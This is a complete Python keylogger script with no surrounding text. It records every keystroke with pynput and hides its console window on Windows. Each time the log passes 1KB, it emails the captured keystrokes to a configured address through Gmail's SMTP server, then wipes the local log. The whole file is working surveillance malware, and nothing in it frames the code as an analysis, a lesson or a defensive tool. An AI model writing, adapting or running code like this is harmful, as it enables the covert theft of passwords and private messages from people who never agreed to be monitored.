import os
import time
import smtplib
from pynput.keyboard import Listener, Key
from threading import Thread
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# File where the keystrokes will be saved
log_file = "keylog.txt"

# Email settings (use your own credentials and details)
sender_email = "your_email@gmail.com"
sender_password = "your_email_password"
receiver_email = "target_email@gmail.com"
smtp_server = "smtp.gmail.com"
smtp_port = 587

# Function to send the logs via email
def send_email(log_data):
    try:
        message = MIMEMultipart()
        message["From"] = sender_email
        message["To"] = receiver_email
        message["Subject"] = "Keylogger Logs"

        message.attach(MIMEText(log_data, "plain"))

        # Connect to the Gmail SMTP server
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            print("Logs sent to email.")
    except Exception as e:
        print(f"Error sending email: {e}")

# Function to log keystrokes
def on_press(key):
    try:
        # Convert key to a string for logging
        if hasattr(key, 'char') and key.char is not None:
            # Log normal character keys
            key_to_log = key.char
        elif key == Key.space:
            key_to_log = " "
        elif key == Key.enter:
            key_to_log = "\n"
        elif key == Key.tab:
            key_to_log = "\t"
        elif key == Key.backspace:
            key_to_log = "<BACKSPACE>"
        else:
            # Handle other special keys
            key_to_log = str(key).replace("'", "")

        # Log the key to the log file
        with open(log_file, "a") as log:
            log.write(key_to_log)
        
        # After a certain number of keys or time, send logs via email
        if os.path.getsize(log_file) > 1024:  # Send logs when the file reaches 1KB
            with open(log_file, "r") as log:
                log_data = log.read()
            send_email(log_data)
            # Clear the log file after sending
            open(log_file, "w").close()

    except Exception as e:
        print(f"Error capturing keystroke: {e}")

# Function to start the keylogger in the background
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

# Function to hide the script window (Windows-only)
def hide_script():
    try:
        if os.name == "nt":
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception as e:
        print(f"Error hiding script window: {e}")

# Ensure the log file is accessible and exists
def initialize_log_file():
    try:
        if not os.path.exists(log_file):
            # Create the log file if it does not exist
            with open(log_file, "w") as log:
                log.write("Keylogger started...\n")
    except Exception as e:
        print(f"Error initializing log file: {e}")

# Main function to run the keylogger
def main():
    initialize_log_file()  # Initialize the log file
    hide_script()  # Hide the script window if running on Windows
    keylogger_thread = Thread(target=start_keylogger)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    while True:
        time.sleep(10)  # Keep the program running in the background

if __name__ == "__main__":
    main()

